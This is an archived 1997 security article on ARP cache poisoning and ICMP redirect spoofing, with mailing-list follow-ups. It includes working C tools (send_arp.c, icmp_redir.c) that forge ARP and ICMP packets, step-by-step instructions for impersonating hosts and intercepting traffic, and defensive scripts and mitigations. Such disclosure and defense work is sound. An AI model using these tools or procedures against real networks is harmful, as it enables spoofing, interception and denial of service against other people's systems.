@@ -1,0 +1,785 @@
+
+[ http://www.rootshell.com/ ]
+
+                    Playing redir games with ARP and ICMP
+                              by yuri volobuev
+
+                                 [ -Intro- ]
+
+There're bugs and there're features.  All too often the distinction between
+the two is in the eye of the beholder.  I'd like to show how two legitimate
+protocols, ARP and ICMP, while properly implemented, can be used to achieve
+something which is, well, not desirable.
+
+While passive attacks (sniffing) that take advantage of the root access to
+LAN are extremely popular and every half-way decent root kit has some kind
+of a net sniffer, active attacks are not nearly as widespread.  Yet, active
+participation in the life of your LAN may bring lots of fun and joy.  You
+knew that already, it's just that technical details had been somewhat
+obscure.  So, let there be more light.
+
+Possibilities outlined here include spoofing and DoS.  While other means of
+spoofing, such as IP blind spoofing, are more general and powerful, in terms
+of who can use them, they require quite a lot of (guess)work and may be hard
+to implement.  ARP spoofing, on contrary, is very easy and robust.
+
+While ARP spoofing is only possible on a local network, it may be a serious
+concern as a way to extend an already existing security breach.  If somebody
+can break into one machine on a subnet, ARP spoofing can be used to
+compromise the rest of it.
+
+                           [ -Background on ARP- ]
+
+[well, originally i wrote few paragraphs outlining arp, but then i figured
+that if you didn't know how it works already, you'll need to learn it from a
+better source.  I recommend "TCP/IP Illustrated" by W.Richard Stevens.]
+
+                           [ -What can be done- ]
+
+Let's consider a hypothetical network
+
+IP          10.0.0.1   10.0.0.2  10.0.0.3  10.0.0.4
+hostname       cat        rat       dog       bat
+hw addr       AA:AA      BB:BB     CC:CC     DD:DD    (for short)
+
+all connected by Ethernet in some simple way (i.e. no switches, no smart
+hubs).  You're on cat, you have root and desire to break into dog.  You know
+that dog trusts rat, so if you can successfully spoof rat, something can be
+gained.
+
+First thing that comes to mind (I think everybody was thinking about this at
+some point) is "why don't I set my IP to the IP of that other machine
+and..." That won't work, at least it won't work reliably.  If you tell
+Ethernet driver on cat that it's IP is 10.0.0.2, it'll start answering ARP
+requests to that IP.  But so will rat.  It's a pure race condition, and
+there's no winner.  However, you can easily be the loser, because this
+particular situation happens quite often when some box is misconfigured to
+use somebody's else's IP, so many implmentations immedeately notice that and
+loudly complain.  Many network traffic analyzers flag that, too.  Seeing a
+syslog message saying something nasty (mentioning cat's Ethernet address) on
+the LAN admin's console is not quite what you want.  And what you want you
+won't necessarily get, that is getting anything remotely close to a working
+connection.
+
+This of course can be helped.  The attached program, send_arp.c, can be a
+useful tool.  Just as its name says, it sends an ARP packet [ARP reply, to
+be exact: since the protocol is stateless, reply will be happily accepted
+even if no one ever asked for it.  Request would do just as well, though,
+because of the ARP caching logic] to the net, and you can make this packet
+to be what you want.  What you want is an ability to specify source and
+target IP and hardware addresses.
+
+First, you don't want your Ethernet driver to talk too much, and it's easy
+to accomplish with ifconfig -arp.  Of course, it'll need ARP info anyway, so
+you'll have to feed it to the kernel manually with arp(8).  The critical
+part is convincing your neighbours.  In the case being described here, you
+want dog to believe that rat's hardware address is that of cat (AA:AA), so
+you send ARP reply with source IP 10.0.0.2, source hw address AA:AA, target
+IP address 10.0.0.3 and target hardware address CC:CC.  Now, for all dog
+knows, rat is at AA:AA.  Cache entry would expire, of course, so it needs to
+be updated (request needs to be resent).  How often depends on the
+particular system, but every 40 sec or so should be sufficient for most
+cases.  Send it more often if you want, it won't hurt.
+
+A complication here could come from an ARP caching implementation feature.
+Some systems (e.g. Linux) would try to update their cache entries by sending
+a unicast ARP request to the cached address (like your wife calling you just
+to make sure you're there).  Such a request can screw things up, because it
+could change victim's ARP entry that we just faked, so it must be prevented.
+This can be accomplished by feeding the "wife" system with replies so that
+it never has to ask for it.  Prevention is the best cure, as always.  This
+time, a real packet from dog to rat should be sent, it's just that cat will
+be sending it, not dog, but for rat there's no way to tell.  Again, doing it
+about every 40 sec is usually OK.
+
+So the procedure is simple.  Bring up an alias interface, e.g. eth0:1 (or
+use your current one, whatever), with rat's IP and ARP on -- you need to set
+up some cache entries first, and it won't work on non-arp interface.  Set up
+a host route entry for dog through the right interface.  Set up a cache
+entry for dog, turn off arp, and it's all set.
+
+Now, inject the venom with send_arp (hitting both dog and rat) and for all
+dog knows, you're on rat.  Just remember to keep sending those ARP packets
+to dog and rat.
+
+This attack only works on the local network, of course (in general, it can
+reach as far as ARP packets can get, usually not too far because ARP packets
+are almost never routed).  But an interesting extension here is taking this
+outside by replacing dog's hardware address in the above plan with the
+router's.  If it works (I'm not sure it always will, router's ARP
+implementation may be tougher to fool, and since I don't want to try it on
+real routers, I don't know, but there's no simple reason why not) you can
+easily impersonate any machine on the local network to the rest of the
+world.  So the target machine could really be anywhere, but the machine
+you're impersonating must be on the same LAN.
+
+                         [ -What else can be done- ]
+
+Aside from spoofing, there's range of other things you can do with ARP.  The
+sky is really the limit here.  DoS is the most obvious application.
+
+Feeding victim wrong hardware address is a powerful way to make it mute.
+You can prevent it from talking to any particular machine (and ARP cache
+size usually allows for the whole network to fit in, so effectively you can
+stop it from talking to everybody for some time).  Obvious target would be
+the router.  Cache poisoning again should be two-way: both the victim system
+and the system you don't want victim to talk to should be fed.  The simplest
+case would be feeding a non-existant address.  It's not the most efficient,
+though, as the system will quickly realize that it's talking to nobody and
+send out an ARP request.  Of course, your next drop of poison will nullify
+this, but you have to do it quite often.  A more efficient approach here is
+feeding the victim with the hardware address of the wrong machine, which
+itself is alive and well.  Again, it depends on a particular situation, but
+very often what happens is that victim keeps sending out packets of various
+types that arrive to the wrong destination, and destination system will
+promptly send ICMP Xxx Unreachable messages back, thus emulating a
+connection in some perverted way.  This pseudo-conection can easily postpone
+cache expiry.  On Linux, for example, pseudo-connection raises cache expiry
+from usual 1 min to about 10 min.  By that time, most or all TCP connections
+are screw up.  Could be quite annoying.  This way, one ARP packet can screw
+someone.
+
+An interesting twist here is so-called "gratuitous ARP".  It's when the
+source and target IPs in the ARP request are the same, and it usually
+appears in a form of an Ethernet broadcast.  Some implementations recognize
+it as a special case, that of a system sending out updated information about
+itself to everybody, and cache that request.  This way one packet could
+screw up the entire network.  It must be admitted, though, that gratuitous
+ARP is not really defined as a part of ARP, so it's up to vendor to (not)
+implement it, and it's becoming increasingly less popular.
+
+ARP is a serious tool for professional practical jokes, too.  Just imagine
+somebody setting up a relay, or tunnel, in a form of own machine that
+convinced two neighbours to send their packets intended for each other to
+relay's Ethernet.  If relay just forwards packets to their real
+destinations, no one would even notice.  However, some simple data stream
+modifications could have quite a spectacular effect on one's mental health.
+A simple, CPU-inexpensive "filter" could be swapping random two bytes at
+irregular long intervals.  If it hits the data portion, most of the
+checksums won't change, i.e. data stream would seem to be intact, yet
+strange and unexplicable things _will_ happen for no apparent reason.
+
+                        [ -ICMP redirects- ]
+
+An effect somewhat similar to ARP cache poisoning can be achieved in a
+different way, again using a legitimate protocol feature, ICMP route
+redirects.  Such a redirect is normally sent by the default router to the
+system to indicate that there's a shorter route to some particular
+destination.  Originally, both network and host route redirects were
+proposed, but later net redirects were deprecated and now are usually
+treated as host redirects.  Properly constructed ICMP packet that passes all
+sanity checks (it must come from the default router for the destination it's
+redirecting, new router should be on a directly connected network, etc.) it
+causes a host-route entry be added to the system routing table.
+
+The concept is just as secure as ICMP itself, i.e. (security)NULL.  Spoofing
+routers IP address is simple, and attached icmp_redir.c does just that.
+Host Requirements RFC states that system MUST follow ICMP redirects unless
+it's a router.  And indeed all the systems I've tried happily accept it
+(except vanilla Linux 2.0.30, where it's broken, it works in 2.0.29 and
+2.0.31pre9, according to Alan Cox).
+
+ICMP redirects present a rather potent DoS.  Unlike ARP cache entries, those
+host routes won't expire with time.  And of course no access to local
+network is required, attack can be launched from anywhere.  So if the target
+system does accept ICMP redirects (and packets can actually reach it) that
+system can be stopped from talking to any particular address on the net
+(well, not all, but those that aren't on the same subnet with the target).
+Nameservers would be an obvious target.
+
+                       [ -What can be done about it- ]
+
+ARP is low level protocol and as such is usually hidden from normal people.
+LAN admins may be concerned with it at times, but if all goes well no one
+pays attention.  One can always inspect contents of ARP cache using arp(8),
+especially if there's some misterious network problem, but again it's not
+the first thing that comes to mind.  Even W95 has arp command, and
+remembering about it may be helpful in certain situations.  However, if
+you're the target of the attack originating from another network via gateway
+arp spoofing, there's no way to tell.  Similarly, host routing table could
+be examined to spot ICMP-generated entries (in most versions of route(1)
+they are marked with D letter in flags field).  Just be aware.
+
+The above ARP attack scheme work perfectly for plain old 10Base2 Ethernet.
+However, if machines are interconnected in some more advanced way,
+particularly using some smart hubs or switches, attack can be more visible
+or even impossible (same goes for passive attacks).  So there's yet another
+reason to invest in a good piece of network equipment.  A good deal of peace
+of mind may just come with it.
+
+In general, however, I personally find it rather sad that things like ICMP
+redirects were made a default.  First, it's often not necessary because many
+networks have very simple structure and there's never a need for anything in
+addition to usual routing table.  Second, on more sophisticated networks
+routing table can be just as well set manually, it's not really such a
+dynamic thing, so why do it via ICMP?  And finally, it's dangerous, so I
+would like to disable it on my systems, even though it'll make them less
+compliant with RFC1122.  Alas, it may not be easy.  On Linux or any other OS
+with sources available, I can at least hack the kernel and #define it out.
+On Irix 6.2 and possibly other versions one can set icmp_dropredirects=1
+with systune (I'm genuinely surprised to see it there, I really am).  Other
+OSes can be configurable, too, I have no information.
+
+With ARP, we basically face a situation when the problem of name resolution
+is solved dynamically without a centralized server.  It doesn't have to be
+this way.  When one wants to map hostname to an IP, nameserver is queried or
+/etc/hosts is consulted, i.e. there's some static mapping established.  I
+don't see why a similar thing can't be done with ARP.  Ethernet hardware
+addresses don't change too often, and when they do change, it won't kill net
+admin to change the corresponding map.  Ethernet can be forced in no-arp
+mode, you just need to make sure your ARP cache has all the entries made as
+permanent.  As a bonus, this will reduce network traffic somewhat.  Standard
+procedures can be used to distribute ARP map, e.g. rdist, rsync (I would say
+NIS, but if you use NIS, ARP is probably not your top security concern
+anyway).  Old tradition of /etc/ethers can be brought back to life.  But
+getting a kick-ass Ethernet switch still looks better to me (paying for it
+does not, though).
+
+And old wisdom still shine bright though time: don't use hostname-only based
+auth.  Those who do shall have no mercy from net gods.
+
+cheers,
+
+yuri
+
+P.S. On Firewalls
+
+I anticipate that many of you, having read the section about ICMP, are
+already flexing the fingers preparing to write a follow-up explaining that
+all those ICMP packets can be filtered out on the firewall, thus it's not a
+problem.  Please don't.  I'm well aware of the concept.  An if you feel you
+absolutely have to, don't cc the list needlessly.
+
+I have to note that many people use "i have firewall, and I like it,
+therefore everyone else should get one or get lost" logic to argue that
+certain security problems are less serious because they can be effectively
+eliminated by putting a firewall between the protected network and
+Internet.  While I fully agree that having firewall is very good for
+security, I want to note that it's not always possible or effective.
+
+Imagine an environment where all machines are directly connected to
+Internet, you have to share subnet with people you don't know who have
+vanilla SGI boxes screaming "hack me pleeeease, my vendor did such a great
+job of making it eeeeeeasy" all over the place (and sure, these people know
+Unix, they've seen it in Jurassic Park... and that would be about it), and
+the router to your subnet is controlled by a separate organization.  Welcome
+to a standard academic environment, where people don't use firewalls.  In
+fact, in some of those environments one would be useful to protect the
+outside world from the people on the inside.  Still, people work there, and
+use computers, too.  And that's where per-host security solutions are
+necessary, it's a jungle where every host is for itself.  So please, next
+time you think "firewall", remember, it's not for everyone.
+
+CUT HERE
+/* send_arp.c
+
+This program sends out one ARP packet with source/target IP and Ethernet
+hardware addresses suuplied by the user.  It compiles and works on Linux
+and will probably work on any Unix that has SOCK_PACKET.
+
+The idea behind this program is a proof of a concept, nothing more.  It
+comes as is, no warranty.  However, you're allowed to use it under one
+condition: you must use your brain simultaneously.  If this condition is
+not met, you shall forget about this program and go RTFM immediately.
+
+yuri volobuev'97
+volobuev@t1.chem.umn.edu
+
+*/
+
+#include <stdio.h>
+#include <ctype.h>
+#include <stdlib.h>
+#include <string.h>
+#include <errno.h>
+#include <netdb.h>
+#include <sys/socket.h>
+#include <linux/in.h>
+#include <arpa/inet.h>
+#include <linux/if_ether.h>
+
+#define ETH_HW_ADDR_LEN 6
+#define IP_ADDR_LEN 4
+#define ARP_FRAME_TYPE 0x0806
+#define ETHER_HW_TYPE 1
+#define IP_PROTO_TYPE 0x0800
+#define OP_ARP_REQUEST 2
+
+#define DEFAULT_DEVICE "eth0"
+
+char usage[]={"send_arp: sends out custom ARP packet. yuri volobuev'97\n\
+\tusage: send_arp src_ip_addr src_hw_addr targ_ip_addr tar_hw_addr\n\n"};
+
+struct arp_packet {
+        u_char targ_hw_addr[ETH_HW_ADDR_LEN];
+        u_char src_hw_addr[ETH_HW_ADDR_LEN];
+        u_short frame_type;
+        u_short hw_type;
+        u_short prot_type;
+        u_char hw_addr_size;
+        u_char prot_addr_size;
+        u_short op;
+        u_char sndr_hw_addr[ETH_HW_ADDR_LEN];
+        u_char sndr_ip_addr[IP_ADDR_LEN];
+        u_char rcpt_hw_addr[ETH_HW_ADDR_LEN];
+        u_char rcpt_ip_addr[IP_ADDR_LEN];
+        u_char padding[18];
+};
+
+void die(char *);
+void get_ip_addr(struct in_addr*,char*);
+void get_hw_addr(char*,char*);
+
+int main(int argc,char** argv){
+
+struct in_addr src_in_addr,targ_in_addr;
+struct arp_packet pkt;
+struct sockaddr sa;
+int sock;
+
+if(argc != 5)die(usage);
+
+sock=socket(AF_INET,SOCK_PACKET,htons(ETH_P_RARP));
+if(sock<0){
+        perror("socket");
+        exit(1);
+        }
+
+pkt.frame_type = htons(ARP_FRAME_TYPE);
+pkt.hw_type = htons(ETHER_HW_TYPE);
+pkt.prot_type = htons(IP_PROTO_TYPE);
+pkt.hw_addr_size = ETH_HW_ADDR_LEN;
+pkt.prot_addr_size = IP_ADDR_LEN;
+pkt.op=htons(OP_ARP_REQUEST);
+
+get_hw_addr(pkt.targ_hw_addr,argv[4]);
+get_hw_addr(pkt.rcpt_hw_addr,argv[4]);
+get_hw_addr(pkt.src_hw_addr,argv[2]);
+get_hw_addr(pkt.sndr_hw_addr,argv[2]);
+
+get_ip_addr(&src_in_addr,argv[1]);
+get_ip_addr(&targ_in_addr,argv[3]);
+
+memcpy(pkt.sndr_ip_addr,&src_in_addr,IP_ADDR_LEN);
+memcpy(pkt.rcpt_ip_addr,&targ_in_addr,IP_ADDR_LEN);
+
+bzero(pkt.padding,18);
+
+strcpy(sa.sa_data,DEFAULT_DEVICE);
+if(sendto(sock,&pkt,sizeof(pkt),0,&sa,sizeof(sa)) < 0){
+        perror("sendto");
+        exit(1);
+        }
+exit(0);
+}
+
+void die(char* str){
+fprintf(stderr,"%s\n",str);
+exit(1);
+}
+
+void get_ip_addr(struct in_addr* in_addr,char* str){
+
+struct hostent *hostp;
+
+in_addr->s_addr=inet_addr(str);
+if(in_addr->s_addr == -1){
+        if( (hostp = gethostbyname(str)))
+                bcopy(hostp->h_addr,in_addr,hostp->h_length);
+        else {
+                fprintf(stderr,"send_arp: unknown host %s\n",str);
+                exit(1);
+                }
+        }
+}
+
+void get_hw_addr(char* buf,char* str){
+
+int i;
+char c,val;
+
+for(i=0;i<ETH_HW_ADDR_LEN;i++){
+        if( !(c = tolower(*str++))) die("Invalid hardware address");
+        if(isdigit(c)) val = c-'0';
+        else if(c >= 'a' && c <= 'f') val = c-'a'+10;
+        else die("Invalid hardware address");
+
+        *buf = val << 4;
+        if( !(c = tolower(*str++))) die("Invalid hardware address");
+        if(isdigit(c)) val = c-'0';
+        else if(c >= 'a' && c <= 'f') val = c-'a'+10;
+        else die("Invalid hardware address");
+
+        *buf++ |= val;
+
+        if(*str == ':')str++;
+        }
+}
+
+CUT HERE
+
+/* icmp_redir.c
+
+This program sends out an ICMP host redirect packet with gateway IP supplied
+by user.  It was written and tested under Linux 2.0.30 and could be rather
+easily modified to work on most Unices.
+
+The idea behind this program is a proof of a concept, nothing more.  It
+comes as is, no warranty.  However, you're allowed to use it under one
+condition: you must use your brain simultaneously.  If this condition is
+not met, you shall forget about this program and go RTFM immediately.
+
+yuri volobuev'97
+volobuev@t1.chem.umn.edu
+
+*/
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <errno.h>
+#include <unistd.h>
+#include <netdb.h>
+#include <syslog.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
+#include <netinet/in.h>
+#include <netinet/ip_icmp.h>
+#include <netinet/ip.h>
+
+#define IPVERSION       4
+
+struct raw_pkt {
+        struct iphdr ip; /* This is Linux-style iphdr.
+                            Use BSD-style struct ip if you want */
+        struct icmphdr icmp;
+        struct iphdr encl_iphdr;
+        char encl_ip_data[8];
+};
+
+struct raw_pkt* pkt;
+
+void die(char *);
+unsigned long int get_ip_addr(char*);
+unsigned short checksum(unsigned short*,char);
+
+int main(int argc,char** argv){
+
+struct sockaddr_in sa;
+int sock,packet_len;
+char usage[]={"icmp_redir: send out custom ICMP host redirect packet.  \
+yuri volobuev'97\n\
+usage: icmp_redir gw_host targ_host dst_host dummy_host\n"};
+char on = 1;
+
+if(argc != 5)die(usage);
+
+if( (sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0){
+        perror("socket");
+        exit(1);
+        }
+
+sa.sin_addr.s_addr = get_ip_addr(argv[2]);
+sa.sin_family = AF_INET;
+
+packet_len = sizeof(struct raw_pkt);
+pkt = calloc((size_t)1,(size_t)packet_len);
+
+pkt->ip.version = IPVERSION;
+pkt->ip.ihl = sizeof(struct iphdr) >> 2;
+pkt->ip.tos = 0;
+pkt->ip.tot_len = htons(packet_len);
+pkt->ip.id = htons(getpid() & 0xFFFF);
+pkt->ip.frag_off = 0;
+pkt->ip.ttl = 0x40;
+pkt->ip.protocol = IPPROTO_ICMP;
+pkt->ip.check = 0;
+pkt->ip.saddr = get_ip_addr(argv[1]);
+pkt->ip.daddr = sa.sin_addr.s_addr;
+pkt->ip.check = checksum((unsigned short*)pkt,sizeof(struct iphdr));
+
+pkt->icmp.type = ICMP_REDIRECT;
+pkt->icmp.code = ICMP_REDIR_HOST;
+pkt->icmp.checksum = 0;
+pkt->icmp.un.gateway = get_ip_addr(argv[4]);
+
+memcpy(&(pkt->encl_iphdr),pkt,sizeof(struct iphdr));
+pkt->encl_iphdr.protocol = IPPROTO_IP;
+pkt->encl_iphdr.saddr = get_ip_addr(argv[2]);
+pkt->encl_iphdr.daddr = get_ip_addr(argv[3]);
+pkt->encl_iphdr.check = 0;
+pkt->encl_iphdr.check = checksum((unsigned short*)&(pkt->encl_iphdr),
+        sizeof(struct iphdr));
+
+pkt->icmp.checksum = checksum((unsigned short*)&(pkt->icmp),
+        sizeof(struct raw_pkt)-sizeof(struct iphdr));
+
+if (setsockopt(sock,IPPROTO_IP,IP_HDRINCL,(char *)&on,sizeof(on)) < 0) {
+        perror("setsockopt: IP_HDRINCL");
+        exit(1);
+        }
+
+if(sendto(sock,pkt,packet_len,0,(struct sockaddr*)&sa,sizeof(sa)) < 0){
+        perror("sendto");
+        exit(1);
+        }
+exit(0);
+}
+
+void die(char* str){
+fprintf(stderr,"%s\n",str);
+exit(1);
+}
+
+unsigned long int get_ip_addr(char* str){
+
+struct hostent *hostp;
+unsigned long int addr;
+
+if( (addr = inet_addr(str)) == -1){
+        if( (hostp = gethostbyname(str)))
+                return *(unsigned long int*)(hostp->h_addr);
+        else {
+                fprintf(stderr,"unknown host %s\n",str);
+                exit(1);
+                }
+        }
+return addr;
+}
+
+unsigned short checksum(unsigned short* addr,char len){
+register long sum = 0;
+
+while(len > 1){
+        sum += *addr++;
+        len -= 2;
+        }
+if(len > 0) sum += *addr;
+while (sum>>16) sum = (sum & 0xffff) + (sum >> 16);
+
+return ~sum;
+}
+
+
+
+
+
+-------------------------------------------------------------------------
+
+
+> all connected by Ethernet in some simple way (i.e. no switches, no smart
+> hubs).  You're on cat, you have root and desire to break into dog.  You know
+> that dog trusts rat, so if you can successfully spoof rat, something can be
+> gained.
+
+Actually with a bit of care the arp spoofing attack you describe works
+through simple mac filtering devices. Not only that but a switched network
+allows you to make purely unicast address attacks that the monitoring
+station won't see as the lan admin is himself switched from your packets...
+See below.
+
+> router's.  If it works (I'm not sure it always will, router's ARP
+> implementation may be tougher to fool, and since I don't want to try it on
+> real routers, I don't know, but there's no simple reason why not) you can
+
+You can generally fool routers fairly easily too.
+
+> from usual 1 min to about 10 min.  By that time, most or all TCP connections
+> are screw up.  Could be quite annoying.  This way, one ARP packet can screw
+> someone.
+
+ARP is a poor choice for this IMHO. The 802.1 spanning tree algorithm used
+by bridges and switches to avoid loops has no protection either and this
+allows you to shut down entire ports when you can do MAC level attacks rather
+than messing around host by host.
+
+> screw up the entire network.  It must be admitted, though, that gratuitous
+> ARP is not really defined as a part of ARP, so it's up to vendor to (not)
+> implement it, and it's becoming increasingly less popular.
+
+Gratuitous ARP is a required part of IP mobile. It is an awkward case. The
+linux approach is to always honour ATF_PERM flags. That is if you create
+a permanent entry it will never be replaced by a learned one even temporarily.
+That allows security concerned people to hardcode addressing.
+
+> Host Requirements RFC states that system MUST follow ICMP redirects unless
+> it's a router.  And indeed all the systems I've tried happily accept it
+> (except vanilla Linux 2.0.30, where it's broken, it works in 2.0.29 and
+> 2.0.31pre9, according to Alan Cox).
+
+Yep. Thats simply a quirk of a bug. A Linux host (as opposed to router) will
+like everyone else honour ICMP redirect unless you firewall or turn them off.
+A router never honours them (its strictly forbidden)
+
+> ICMP redirects present a rather potent DoS.  Unlike ARP cache entries, those
+> host routes won't expire with time.  And of course no access to local
+
+No. ICMP redirect host routes expire after a few minutes. The host has to do
+this so that a temporary situation does not cause a permanent change. If
+you are lucky enough to be on a switched network with a big netmask (class B
+or bigger) then you can also use ICMP host redirects against many boxes to
+add 65000+ routes to their tables. Unixes generally eat ram and carry on as
+they have good routing algorithms designed to cope with the backbones. Many
+"desktop OS" products use linear searches for their routes.....
+
+> The above ARP attack scheme work perfectly for plain old 10Base2 Ethernet.
+> However, if machines are interconnected in some more advanced way,
+> particularly using some smart hubs or switches, attack can be more visible
+> or even impossible (same goes for passive attacks).  So there's yet another
+> reason to invest in a good piece of network equipment.  A good deal of peace
+> of mind may just come with it.
+
+A filtering hub lets you perform this attack
+
+        ping the two hosts you wish to snoop between.
+
+        Using the mac address you learn via arp send both a unicast arp
+        giving yourself as the answer for the other IP address.
+
+        Route between the two yourself and log the frames.
+
+Better yet, the admin on another port is filtered from your unicast frames.
+Nothing they can see coming out of their hub is likely to show up the attack.
+
+> compliant with RFC1122.  Alas, it may not be easy.  On Linux or any other OS
+> with sources available, I can at least hack the kernel and #define it out.
+> On Irix 6.2 and possibly other versions one can set icmp_dropredirects=1
+
+On Linux you can firewall icmp redirect packets specifically - ditto Im sure
+*BSD. That makes it a single line command option.
+
+> permanent.  As a bonus, this will reduce network traffic somewhat.  Standard
+> procedures can be used to distribute ARP map, e.g. rdist, rsync (I would say
+> NIS, but if you use NIS, ARP is probably not your top security concern
+> anyway).  Old tradition of /etc/ethers can be brought back to life.  But
+> getting a kick-ass Ethernet switch still looks better to me (paying for it
+> does not, though).
+
+You have a fundamental problem, and this is why neither IPv6 or bootp are
+any more secure to these forms of attack. Unless you burn keys into the roms
+or onto the disks of hosts by a non IP method you will never be able to set
+up the first secure session to learn the others - you have a problem akin
+to a PGP web of trust with nobody else to trust. With IPv6 you can at least
+theoretically implement IP-ESP (encryption headers) even on link layer
+"neighbour discovery" packets. In IPv6 there is local IPv6 rather than ARP
+thus one day we can crypt those too.
+
+
+--------------------------------------------------------------------------------
+
+
+Having anticipated such a problem already (in our envoronment, there are
+many lab machines which have NFS access to user disks on a server.  These
+machines may even be turned OFF which makes it easy for a spoofer to get
+in.), I wrote a short Perl script designed to be run from the system
+startup file.  Basically, it "primes" the ARP cache on Linux with the
+IP and MAC addresses of known machines, setting a flag so that they are
+never removed from the cache and can never be changed.
+
+The config file format is simple -- IP address followed by MAC address,
+separated by whitespace.  Pound at the beginning of a line indicates
+comment.
+
+This has only been tested on Linux -- people on other platforms may need
+to adjust the parameters to arp in the system call.
+
+It is a quick 'n' dirty program, but works -- maybe it will be useful to
+somebody out there, too.
+
+Note: you want to make sure that it is run after your network interface is
+brought up but before any servers or clients are started; otherwise,
+somebody may be able to sneak in a connection before the ARP tables are
+"locked".
+
+Here's the script:
+
+#!/usr/bin/perl
+# by John Goerzen <jgoerzen@cs.twsu.edu>
+# Program: forcehwaddr
+# Program to run ARP to force certain tables.
+
+# Specify filenames to read from on command line, or read from stdin.
+
+foreach (<>) {                  # For each input line....
+  chomp;                        # Strip if CR/LF
+  if (/^#/) { next; }           # If it's a comment, skip it.
+  if (((($host, $hw) = /\s*(.+?)\s+(\S+)\s*/) == 2) &&
+      !(/^#/)) {
+     # The text between the slashes parses the input line as follows:
+     # Ignore leading whitespace.  (\s*)
+     # Then, start matching and put it into $host ($host, (.+?))
+     # Skip over the whitespace after that (\s+)
+     # Start matching.  Continue matching until end of line or optional
+     # trailing whitespace.
+
+     # Then, the if checks to see that both a
+     # host and a hardware address were matched.
+     # (2 matches).  If not, we skip the
+     # line (assuming it is blank or invalid or something).
+     # The second part of the if checks to see if the line starts with
+     # a pound sign; if so, ignore it (as a comment).
+
+     # Otherwise, run the appropriate command:
+    printf("Setting IP %-15s to hardware address %s\n", $host, $hw);
+    system "/usr/sbin/arp -s $host $hw\n";
+  }
+}
+
+
+-------------------------------------------------------------------------
+
+
+Some systems (notably BSD variants) have the arp -f option:
+
+     -f      Causes the file filename to be read and multiple entries to be
+             set in the ARP tables.  Entries in the file should be of the form
+
+                   hostname ether_addr [temp] [pub]
+
+             with argument meanings as given above.
+
+
+-------------------------------------------------------------------------
+
+
+Please note Yuri's original posting - unless you use the '-arp' option with
+ifconfig these "permanent" settings will get replaced! Also even with -arp any
+host that has not had the etheraddress set using arp -f or arp -s will be added
+to the arp cache.
+
+This is what I found with IRIX 6.2, HP-UX or FreeBSD and I would be surprised
+if any other OS was very different - the "permanent" flag stays set but the
+etheraddress will change unless -arp has been used.
+
+Easy to test by setting a nonesense ether for a host with arp -s and then send
+a ping comparing the arp cache before and after. Nothing appears in logfiles
+unless you have something monitoring arps such as arpwatch.
+
+
+-------------------------------------------------------------------------
+
+I was playing around with the ICMP-redirect spoofing code from Yuri Volobuev 
+and I've noticed some behaviors of IP stacks that seem to limit it's 
+effectiveness at spoofing on a LAN. I tried it on 3 digital unix 4 boxes, 
+2 Solaris 2.5 boxes, and an HPUX box, and got similair results on all of them..
+
+Quoting from W. Stevens TCP/IP Illustrated, Volume 1 page 123:
+...
+Additionally, a 4.4BSD host that recieves an ICMP redirect performs some checks
+before modifying its routing table. These are to prevent a misbehaving router or
+host, or a malicious user, from incorrectly, modifying a system's routing table.
+
+1. The new router must be on a directly connected network.
+2. The redirect must be from the current router for that destination.
+3. The redirect cannot tell the host to use itself as the router.
+4. The route that's being modified must be an indirect route.
+...
+
+So, basically, if you have two machines on the same subnet and they both have a
+net route for that subnet, then you can't use ICMP to re-route one to another.
+At least this is true for the boxes I've tried it on..
+
+You can still use redirects to forward traffic destined for hosts that are on
+a different subnet or outside of the network.
+
+humble - jmcdonal@unf.edu
+
